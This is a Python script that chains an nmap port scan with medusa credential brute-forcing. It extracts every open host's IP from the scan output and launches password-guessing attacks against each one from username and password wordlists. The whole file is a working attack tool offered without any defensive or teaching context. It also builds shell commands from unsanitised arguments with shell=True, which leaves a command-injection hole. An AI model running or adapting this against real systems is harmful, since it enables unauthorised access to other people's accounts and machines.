import re
import subprocess
import argparse

def scan(ip,port,service):
	command="nmap "+ip+" --exclude 10.129.1.36,10,129.6.7,10.129.6.2 -p "+port+" --open  -o "+service+"_nmap.txt"
	subprocess.call(command,shell=True)

	reip = re.compile(r'(?<![\.\d])(?:\d{1,3}\.){3}\d{1,3}(?![\.\d])')
	scan=open(service+"_nmap.txt",'r')
	savefile=open('iplist.txt','w')
	line=scan.read()
	result=reip.findall(line)
	for ip in result:
		savefile.write(ip)
		savefile.write("\n")
		Mcommand="medusa -M "+service+" -h "+ip+" -U uesrname.txt -P bestpass.txt -e ns -F -O "+service+"_report.txt"
		hah=subprocess.call(Mcommand,shell=True)

	scan.close()
	savefile.close()	

if __name__=="__main__":
	parser=argparse.ArgumentParser(description="usersss")
	parser.add_argument('--ip',type=str,dest="ip")
	parser.add_argument('-p',type=str,dest="port")
	parser.add_argument('-s',type=str,dest="service")
	args=parser.parse_args()
	ip=args.ip
	port=args.port
	service=args.service
	print ip,port,service
	scan(ip,port,service)
